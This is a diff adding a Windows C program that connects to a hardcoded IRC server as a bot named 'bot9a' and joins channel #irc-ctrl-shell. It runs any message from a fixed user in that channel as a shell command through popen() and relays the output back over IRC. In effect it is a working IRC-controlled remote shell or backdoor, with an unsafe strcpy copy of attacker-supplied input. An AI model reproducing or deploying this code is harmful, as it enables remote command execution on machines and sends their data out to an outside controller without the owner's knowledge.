@@ -1,0 +1,157 @@
+/* holmes.freenode.net 83.170.73.249  6665 */
+
+/* privmsg #ubuntu-cn :im using telnet now! */
+
+/* PING :holmes.freenode.net */
+
+#include <stdio.h>
+#include <malloc.h>
+#include <string.h>
+#include <windows.h>
+#include <stdlib.h>
+#include <winsock.h>
+#pragma comment(lib,"ws2_32.lib")
+#include <pthread.h>
+#pragma comment(lib, "pthreadVC2.lib")
+
+    char *ping = "PING :holmes.freenode.net";
+    char *pong = "PONG :holmes.freenode.net\r\n";
+    char *keyword = "jusss PRIVMSG #irc-ctrl-shell :";
+    SOCKET sockfd;
+
+pthread_i()
+{char buffer[9999]={0};
+  char cmd[9999]={0};
+    char popen_out[1024]={0};
+    char popen_out_send[1080] = {"privmsg #irc-ctrl-shell :"};
+    FILE *popen_fp;
+    while ( 1 ) {
+	
+	recv(sockfd,buffer,9999,0);
+	printf("%s",buffer); 
+
+	if (strstr(buffer,ping)) send(sockfd,pong,strlen(pong),0); /* PING PONG */
+
+	/* execute command in shell */
+
+	if (strstr(buffer,keyword)) {
+	  strcpy(cmd,((strstr(buffer,keyword))+31));
+
+	  popen_fp = popen(cmd,"r");
+	  while ( fgets(popen_out,1024,popen_fp) != NULL) {
+	    strcat(popen_out_send,popen_out);
+
+	    send(sockfd,popen_out_send,strlen(popen_out_send),0);
+	    /*	    Sleep(1000);  irc server don't allow flood */
+	    memset(popen_out_send,0,1080);
+	    memset(popen_out,0,1024);
+	    strcat(popen_out_send,"privmsg #irc-ctrl-shell :");
+	    
+	  }
+	  pclose(popen_fp);
+	  memset(buffer,0,9999);
+	  memset(cmd,0,9999);
+	}
+	}
+}
+pthread_ii()
+{char buffer[9999]={0};
+  char cmd[9999]={0};
+    char popen_out[1024]={0};
+    char popen_out_send[1080] = {"privmsg #irc-ctrl-shell :"};
+    FILE *popen_fp;
+    while ( 1 ) {
+	
+	recv(sockfd,buffer,9999,0);
+	printf("%s",buffer); 
+
+	if (strstr(buffer,ping)) send(sockfd,pong,strlen(pong),0); /* PING PONG */
+
+	/* execute command in shell */
+
+	if (strstr(buffer,keyword)) {
+	  strcpy(cmd,((strstr(buffer,keyword))+31));
+
+	  popen_fp = popen(cmd,"r");
+	  while ( fgets(popen_out,1024,popen_fp) != NULL) {
+	    strcat(popen_out_send,popen_out);
+
+	    send(sockfd,popen_out_send,strlen(popen_out_send),0);
+	    /*	    Sleep(1000);  irc server don't allow flood */
+	    memset(popen_out_send,0,1080);
+	    memset(popen_out,0,1024);
+	    strcat(popen_out_send,"privmsg #irc-ctrl-shell :");
+	    
+	  }
+	  pclose(popen_fp);
+	  memset(buffer,0,9999);
+	  memset(cmd,0,9999);
+	}
+	}
+}
+
+int main()
+{
+    char *nick = "NICK bot9a\r\n";
+    char *user = "USER bot9a 8 * :bot9a\r\n";
+    char *channel = "join #irc-ctrl-shell\r\n";
+    char *buffer, *cmd;
+    int  recv_length = 0;
+    pthread_t pid_i,pid_ii;
+    struct sockaddr_in irc_addr;
+    irc_addr.sin_family=AF_INET;
+    irc_addr.sin_addr.s_addr=inet_addr("83.170.73.249");
+    irc_addr.sin_port=htons(6665);
+
+
+    WSADATA wsaData;
+
+    buffer = malloc(10485760);
+    cmd = malloc(9999);
+
+    memset(buffer,0,10485760);
+    memset(cmd,0,9999);
+
+    WSAStartup(MAKEWORD(2,2),&wsaData);
+    sockfd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+
+    connect(sockfd,(struct sockaddr*)&irc_addr,sizeof(irc_addr));
+    send(sockfd,nick,strlen(nick),0);
+    send(sockfd,user,strlen(user),0);
+
+    /* fix this like test joined */
+    recv_length = recv(sockfd,buffer,10485760,0);
+    if (recv_length > 0) printf("connecting...\r\n");
+
+    else printf("connect fail...\r\n");
+
+    printf("%s",buffer);
+
+    send(sockfd,channel,strlen(channel),0);
+
+    /* test if it has joined the channel */
+    while ( 1 ) {
+      memset(buffer,0,10485760);
+      recv(sockfd,buffer,10485760,0);
+
+      printf("%s",buffer);
+
+      if (strstr(buffer,"#irc-ctrl-shell :End of /NAMES list.")) {
+	printf("already joined the channel\r\n");
+	break;
+      }
+    }
+
+    memset(buffer,0,10485760);
+    memset(cmd,0,9999);
+
+    pthread_create(&pid_i,NULL,(void *)&pthread_i,NULL);
+    pthread_create(&pid_ii,NULL,(void *)&pthread_ii,NULL);
+    pthread_join(pid_i,NULL);
+    pthread_join(pid_ii,NULL);
+
+    closesocket(sockfd);
+    WSACleanup();
+    return 0;   
+
+}
